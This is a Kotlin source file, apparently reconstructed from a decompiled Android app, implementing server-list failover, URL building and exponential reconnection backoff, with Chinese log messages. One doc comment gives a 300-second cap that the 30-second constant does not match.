package com.storm.safe.rock.network

import android.util.Log
import com.storm.safe.rock.service.modules.NetworkManager
import kotlin.math.min
import kotlin.random.Random

/**
 * Manages server URL list, failover rotation, and reconnection backoff.
 *
 * Extracted from NetworkManager (JADX: C0323a8).
 * - calculateReconnectDelay() — JADX: implicit in keepalive loop
 * - setServerUrls() — JADX: b6
 * - currentUrl() — JADX: c0
 * - applyServerConfig() — JADX: a4
 * - buildHttpUrl() — JADX: b0
 * - buildWsUrl() — JADX: b2
 * - switchToNextServer() — JADX: d8
 * - handleConnectionFailure() — JADX: b8
 * - resetFailureCounter() — JADX: b9
 *
 * Note: parseServerUrl() and isSecure() remain as static methods on
 * NetworkManager.Companion; this class calls them via NetworkManager.parseServerUrl().
 */
class ReconnectionManager(
    private val dataSyncClient: DataSyncClient,
    private val httpManager: HttpManager
) {
    companion object {
        private const val TAG = "ReconnectionManager"

        // ── Reconnection constants ──
        // JADX: f53123c3
        const val BASE_RECONNECT_DELAY_MS = 5000L
        // JADX: f53124c4
        const val MAX_RECONNECT_DELAY_MS = 30000L
        const val JITTER_MAX_MS = 2000L

        // ── Server failure threshold ──
        // JADX: f53111b1
        const val MAX_CONSECUTIVE_FAILURES = 5
    }

    var deviceId: String = ""

    // JADX: f53108a8
    var serverUrls: List<String> = emptyList()
        internal set

    // JADX: f53109a9
    @Volatile
    var currentServerIndex: Int = 0
        internal set

    // JADX: f53110b0
    @Volatile
    var consecutiveFailures: Int = 0
        internal set

    // JADX: f53112b2 — lock for failure counter
    private val failureLock = Any()

    // JADX: f53105a5
    var serverHost: String = ""
        internal set

    // JADX: f53106a6
    var serverPort: Int = 8080
        internal set

    /**
     * Callback to update NetworkManager connection flags after server switch.
     */
    var onServerSwitched: (() -> Unit)? = null

    /**
     * Calculate reconnect delay with exponential backoff and jitter.
     *
     * JADX: implicit in keepalive loop pattern
     * Base: 5s, doubles each attempt, capped at 300s (5min).
     * Jitter: random 0-2s added.
     */
    fun calculateReconnectDelay(attempt: Int): Long {
        val exponentialDelay = BASE_RECONNECT_DELAY_MS * (1L shl min(attempt, 16))
        val cappedDelay = min(exponentialDelay, MAX_RECONNECT_DELAY_MS)
        val jitter = Random.nextLong(0, JITTER_MAX_MS + 1)
        return cappedDelay + jitter
    }

    /**
     * Configure server URLs list from semicolon-separated string.
     * JADX: b6
     */
    fun setServerUrls(urls: String) {
        if (urls.isBlank()) return
        serverUrls = if (urls.contains(";")) {
            urls.split(";").map { it.trim() }.filter { it.isNotEmpty() }
        } else {
            listOf(urls.trim()).filter { it.isNotEmpty() }
        }

        if (serverUrls.isEmpty()) {
            Log.e(TAG, "服务器列表为空")
            return
        }

        Log.d(TAG, "多服务器配置: ${serverUrls.size} 个服务器")
        serverUrls.forEachIndexed { index, url ->
            Log.d(TAG, "   [$index] $url")
        }

        currentServerIndex = 0
        consecutiveFailures = 0
    }

    /**
     * Get the current server URL from the list.
     * JADX: c0
     */
    fun currentUrl(): String? {
        if (serverUrls.isEmpty()) return null
        val idx = currentServerIndex
        return if (idx < 0 || idx >= serverUrls.size) {
            serverUrls.firstOrNull()
        } else {
            serverUrls[idx]
        }
    }

    /**
     * Apply current server URL to serverHost/serverPort fields and clients.
     * JADX: a4 (configureClients)
     */
    fun applyServerConfig() {
        if (serverUrls.isEmpty()) {
            Log.e(TAG, "服务器列表为空，无法配置")
            return
        }
        val url = currentUrl() ?: run {
            Log.e(TAG, "无法获取当前服务器URL")
            return
        }
        val (host, port) = NetworkManager.parseServerUrl(url)
        serverHost = host
        serverPort = port

        val secure = NetworkManager.isSecure(url)

        // Configure DataSyncClient WS URL
        val wsUrl = if (!secure) {
            "ws://$host:$port"
        } else if (port == 443) {
            "wss://$host"
        } else {
            "wss://$host:$port"
        }
        dataSyncClient.serverUrl = wsUrl.trimEnd('/')
        dataSyncClient.deviceId = deviceId
        Log.d(TAG, "DataSyncClient 已配置: $wsUrl [服务器 ${currentServerIndex + 1}/${serverUrls.size}]")

        // Sync HttpManager config — JADX: C0268a1 uses same auth as DataSyncClient
        // Only override baseUrl if not already set from config.json server_url
        if (httpManager.baseUrl.isEmpty()) {
            httpManager.baseUrl = buildHttpUrl() ?: url
        }
        httpManager.deviceId = deviceId
        httpManager.ownerToken = dataSyncClient.ownerToken
    }

    /**
     * Build HTTP base URL from current server.
     * JADX: b0
     */
    fun buildHttpUrl(): String? {
        val url = currentUrl() ?: return null
        val (host, port) = NetworkManager.parseServerUrl(url)
        return if (NetworkManager.isSecure(url)) {
            if (port == 443) "https://$host" else "https://$host:$port"
        } else {
            "http://$host:$port"
        }
    }

    /**
     * Build WebSocket URL from current server.
     * JADX: b2
     */
    fun buildWsUrl(): String {
        if (serverHost.isEmpty()) return ""
        val url = currentUrl() ?: ""
        return if (NetworkManager.isSecure(url)) {
            if (serverPort == 443) "wss://$serverHost" else "wss://$serverHost:$serverPort"
        } else {
            if (serverPort == 80) "ws://$serverHost" else "ws://$serverHost:$serverPort"
        }
    }

    /**
     * Switch to the next server URL after failure.
     * JADX: d8
     *
     * Returns false if only one server available.
     * On switch: disconnects current WS, resets flags, reconfigures client.
     */
    fun switchToNextServer(): Boolean {
        synchronized(failureLock) {
            if (serverUrls.size <= 1) {
                Log.w(TAG, "只有一个服务器，无法切换")
                return false
            }
            val oldIndex = currentServerIndex
            currentServerIndex = (currentServerIndex + 1) % serverUrls.size
            consecutiveFailures = 0

            val newUrl = serverUrls[currentServerIndex]
            Log.i(TAG, "切换服务器: [${oldIndex + 1}] -> [${currentServerIndex + 1}] ($newUrl)")

            // Disconnect current, will be reconnected by keepalive
            dataSyncClient.disconnect()
            onServerSwitched?.invoke()

            // Apply new server config
            try {
                applyServerConfig()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to apply server config after switch", e)
            }
            return true
        }
    }

    /**
     * Handle a connection failure: increment counter, switch server if threshold hit.
     * JADX: b8
     */
    fun handleConnectionFailure() {
        synchronized(failureLock) {
            consecutiveFailures++
            Log.w(TAG, "服务器连接失败 ($consecutiveFailures/$MAX_CONSECUTIVE_FAILURES)")

            if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES) {
                Log.w(TAG, "服务器连续失败 $MAX_CONSECUTIVE_FAILURES 次，尝试切换")
                switchToNextServer()
            }
        }
    }

    /**
     * Reset failure counter after successful operation.
     * JADX: b9
     */
    fun resetFailureCounter() {
        synchronized(failureLock) {
            if (consecutiveFailures > 0) {
                Log.d(TAG, "服务器连接成功，重置失败计数")
                consecutiveFailures = 0
            }
        }
    }
}
